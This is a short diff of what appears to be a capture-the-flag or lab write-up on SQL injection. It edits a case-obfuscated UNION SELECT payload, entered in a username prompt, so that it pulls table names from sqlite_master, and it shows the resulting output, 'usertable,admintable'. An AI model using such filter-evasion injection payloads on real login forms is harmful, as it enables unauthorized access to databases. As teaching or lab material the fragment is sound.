@@ -55,7 +55,7 @@ Password: tF8tj2o94WE4LKC
 ## Obfuscation Techniques to Bypass Filters
 > retrieve tablename 
 ```bash
-Please enter your username: ' UniOn SeleCt group_concat(sql) FROM sqlite_master ' 
+Please enter your username: ' UniOn SeleCt group_concat(tbl_name) FROM sqlite_master ' 
 Password: usertable,admintable
 ```
 ```bash
